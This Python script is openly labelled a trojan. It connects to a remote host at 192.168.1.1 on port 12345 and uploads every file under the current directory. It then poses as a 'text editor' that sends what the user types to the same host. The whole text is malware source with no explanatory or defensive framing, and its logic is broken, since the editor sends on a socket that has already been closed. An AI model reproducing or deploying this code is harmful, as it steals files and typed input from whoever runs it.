import socket
import os

def send_file(conn, file_name):
    with open(file_name, 'rb') as file:
        while True:
            data = file.read(1024)
            if not data:
                break
            conn.send(data)

def upload_files(conn):
    for root, dirs, files in os.walk('.'):
        for file in files:
            file_path = os.path.join(root, file)
            print(f'Sending {file_path}...')
            send_file(conn, file_path)

# Create a socket
s = socket.socket()

# Connect to the remote server
s.connect(('192.168.1.1', 12345))

# Send a message to the server
s.send(b'Trojan horse connected!')

# Upload the files to the server
upload_files(s)

# Close the connection
s.close()

# Create a text editor
def text_editor():
    print("Welcome to the text editor!")
    while True:
        message = input("Enter your message: ")
        if message == 'EXIT':
            break
        print("Sending message...")
        s.send(message.encode())

# Start the text editor
text_editor()
